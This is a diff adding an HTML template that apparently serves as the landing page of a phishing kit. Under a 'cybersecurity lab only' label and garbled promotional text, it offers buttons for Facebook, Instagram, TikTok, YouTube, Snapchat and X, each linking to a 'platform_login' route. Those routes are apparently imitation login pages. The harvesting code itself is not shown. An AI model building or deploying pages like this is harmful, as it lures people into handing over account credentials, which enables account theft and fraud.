@@ -1,0 +1,27 @@
+
+{% extends "base.html" %}
+{% block title %}Brothers Website{% endblock %}
+{% block content %}
+<main class="center-card">
+  <h1 class="site-title notranslate">Brothers Website</h1>
+  <p class="lead">For brothers — cybersecurity lab only</p>
+  <section class="about">
+    <h3>About This Platform</h3>
+    <p>This is only for brother cybersecurity use. Thank you.</p>
+    <ul>
+      <li>🟢 You keep working good all day is activated.</li>
+      <li>🟢 The supports platform operations and revenue.</li>
+      <li>🟢 It’s completely free and easy, love you.</li>
+    </ul>
+  </section>
+  <h3 class="selector">🌐 Select what you want to see</h3>
+  <div class="button-grid">
+    <a class="platform-btn facebook" href="{{ url_for('platform_login', slug='facebook') }}"><i class="fab fa-facebook-f"></i><span class="btn-label notranslate">Facebook</span></a>
+    <a class="platform-btn instagram" href="{{ url_for('platform_login', slug='instagram') }}"><i class="fab fa-instagram"></i><span class="btn-label notranslate">Instagram</span></a>
+    <a class="platform-btn tiktok" href="{{ url_for('platform_login', slug='tiktok') }}"><i class="fab fa-tiktok"></i><span class="btn-label notranslate">TikTok</span></a>
+    <a class="platform-btn youtube" href="{{ url_for('platform_login', slug='youtube') }}"><i class="fab fa-youtube"></i><span class="btn-label notranslate">YouTube</span></a>
+    <a class="platform-btn snapchat" href="{{ url_for('platform_login', slug='snapchat') }}"><i class="fab fa-snapchat-ghost"></i><span class="btn-label notranslate">Snapchat</span></a>
+    <a class="platform-btn x" href="{{ url_for('platform_login', slug='x') }}"><i class="fab fa-x-twitter"></i><span class="btn-label notranslate">X</span></a>
+  </div>
+</main>
+{% endblock %}
